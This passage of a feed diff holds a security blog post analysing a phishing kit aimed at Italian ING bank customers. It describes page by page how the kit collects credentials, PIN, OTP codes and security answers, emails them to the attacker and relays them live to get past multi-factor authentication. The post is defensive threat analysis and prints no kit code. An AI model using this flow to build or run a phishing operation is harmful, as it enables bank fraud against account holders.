+&lt;li&gt;&lt;code&gt;index.php&lt;/code&gt; -&amp;gt; check if the IP of the visitor is in a blacklist, if that&amp;rsquo;s the case, redirect the connection to google.com&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;login.php&lt;/code&gt; -&amp;gt; convince the victim to enter his/her client ID, phone number and birth date for &amp;ldquo;security reasons&amp;rdquo; and send them to the attacker via email. As soon as the criminal receives the stolen credentials, he/she will use them to sign in to the real ING e-banking platform.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;pin.php&lt;/code&gt; -&amp;gt; ask the victim to provide the PIN code for his account and send it via email to the criminal. Now the criminal will use it to continue the signin process to ING bank pretending to be the victim. After that, ING will send an OTP code to the victim&amp;rsquo;s phone because of the login process initiated by the criminal (which submitted the victim&amp;rsquo;s phone number).&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;otp.php&lt;/code&gt; -&amp;gt; ask the victim to provide the OTP code he should have received from the bank, and send it via email to the criminal. Now the criminal enters the OTP code and (if the code is not expired) he/she should have access to the victim&amp;rsquo;s account.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;domande.php&lt;/code&gt; (it means &lt;em&gt;questions&lt;/em&gt; in Italian) -&amp;gt; ask the victim to provide the answers to the security questions and send them via email to the criminal. This combination of questions/answers could be used as a backup mechanism to authenticate to ING.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;completa.php&lt;/code&gt; -&amp;gt; show a message to the victim says that it will be soon contacted by an operator.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;In this process, time has a crucial role, because OTP codes are valid only for some seconds (usually 60), thus the criminal either has an automatic agent to perform the login session with ING when the stolen credentials are received, or he/she will have to perform these actions manually and &amp;ldquo;live&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;In addition, at every step, the PHP code will store the credentials obtained in the previous step in log file, e.g. the code in &lt;code&gt;pin.php&lt;/code&gt; will write the credentials obtained during the execution of &lt;code&gt;login.php&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Below is a schema with the screenshots of the mentioned pages. I didn&amp;rsquo;t include &lt;code&gt;index.php&lt;/code&gt; because it does not have any graphical elements; instead I replaced the first step with a dialog in &lt;code&gt;login.php&lt;/code&gt;, which tries to convince the user to enter the security details of his/her account.&lt;/p&gt;
+&lt;figure&gt;
+&lt;img class="my-0 rounded-md" src="https://andpalmier.com/images/posts/phishing-findings/ep3/diagram.webp" alt="schema of the phishig kit targeting ING Bank customers" /&gt;
+&lt;figcaption&gt;Schema of the phishing kit&lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;p&gt;It&amp;rsquo;s interesting to note that the kit is performing some basic checks for some input fields (such as the birth date of the victim), but, in one of the final steps, it does not even specify which information should be entered in the form, indeed in &lt;code&gt;domande.php&lt;/code&gt; we can only see some asterisks before the input field, which - in addition - accepts only numerical data.&lt;/p&gt;
+&lt;h2 class="relative group"&gt;Conclusion
+&lt;div id="conclusion" class="anchor"&gt;&lt;/div&gt;
+&lt;/h2&gt;
+&lt;p&gt;In this post, we analyzed a phishing kit targeting Italian customers of ING bank.&lt;/p&gt;
+&lt;p&gt;A lot of the code-base of the kit was imported from the original ING page without too much caring. Indeed, while inspecting the network connection, we can see that the kit is trying to reach out to the ING private APIs without receiving an answer (probably because the APIs are checking that the request is coming from an authorized source).&lt;/p&gt;
+&lt;figure&gt;
+&lt;img class="my-0 rounded-md" src="https://andpalmier.com/images/posts/phishing-findings/ep3/api.webp" alt="phishing kit of ING Bank trying to contact ING APIs" /&gt;
+&lt;figcaption&gt;The kit tries to access to the Italian ING APIs&lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;p&gt;The code includes a lot of comments and, in general, it seems that is still a work in progress; as a matter of fact, when it was online, it wasn&amp;rsquo;t able to lure many victims.&lt;/p&gt;
+&lt;p&gt;The ING kit shows how some criminals are trying to bypass Multi-Factor Authentication, by sending credentials (including OTP) via email as soon as these are stolen; and, probably in case they are not able to enter the OTP quick enough, they also try to steal the security questions, which are often used as a fallback mechanism to access the account.&lt;/p&gt;</description></item></channel></rss>
